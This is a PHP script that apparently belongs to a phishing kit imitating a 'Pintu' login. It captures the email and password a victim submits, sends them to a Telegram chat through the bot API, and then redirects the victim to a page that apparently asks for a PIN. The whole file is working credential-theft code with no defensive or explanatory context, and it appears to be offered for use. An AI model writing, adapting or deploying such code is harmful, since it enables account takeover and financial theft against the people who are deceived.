<?php

session_start();
include "./tele.php";

$email= $_POST['email'];
$_SESSION['email'] = $email;
$password = $_POST['password'];
$_SESSION['password'] = $password;

$message = "
├• Pintu | 𝗗𝗮𝘁𝗮 𝗖𝘂𝗮𝗻 | ".$email."
├───────────────────
├• *Username* : ".$email."
├• *Password* : ".$password."
╰───────────────────
";
function sendMessage($telegram_id, $message, $token_bot) {
    $url = "https://api.telegram.org/bot" . $token_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $token_bot);
header('Location: ../pin.html');
?>